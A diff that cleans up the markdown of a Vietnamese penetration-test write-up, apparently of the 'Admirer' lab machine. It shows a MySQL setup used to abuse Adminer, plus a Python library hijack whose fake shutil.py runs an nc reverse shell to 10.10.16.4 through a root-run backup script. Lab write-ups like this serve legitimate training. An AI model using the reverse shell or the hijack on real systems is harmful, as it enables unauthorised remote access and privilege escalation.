@@ -99,6 +99,7 @@ Lỗ hổng: Tiết lộ tệp tùy ý. Nếu chúng ta phải phân loại nó 
 - Xóa những hành động đó và tiếp tục tạo cơ sở dữ liệu có cùng tên với “quản trị viên” của máy mục tiêu
 - tạo một bảng test với column là data.
 
+```sql
 CREATE DATABASE admirer;
 
 CREATE USER 'adminer'@'%' IDENTIFIED BY 'password';
@@ -108,6 +109,7 @@ GRANT ALL PRIVILEGES ON *. *TO'adminer'@'%';
 FLUSH PRIVILEGES;
 
 create table test(data VARCHAR(255));
+```
 
 sửa để Mysql không chỉ listen internal -> Sửa dòng này: bind-address = 0.0.0.0 là ok.
 
@@ -214,7 +216,7 @@ backup_web()
     if ![ "$EUID" -eq 0 ]
     then
         echo "Running backup script in the background, it might take a while..."
-        **/opt/scripts/backup.py** &
+        /opt/scripts/backup.py &
     else
         echo "Insufficient privileges to perform the selected operation."
     fi
@@ -289,7 +291,7 @@ cat /opt/scripts/backup.py
 ```python
 #!/usr/bin/python3
 
-from **shutil** import **make_archive**
+from shutil import make_archive
 
 src = '/var/www/html/'
 
@@ -313,7 +315,7 @@ nội dung file shutil.py
 ```python
 import os
 
-def **make_archive**(a, b, c):
+def make_archive(a, b, c):
 
 os.system("nc 10.10.16.4 1234 -e'/bin/bash'")
 ```
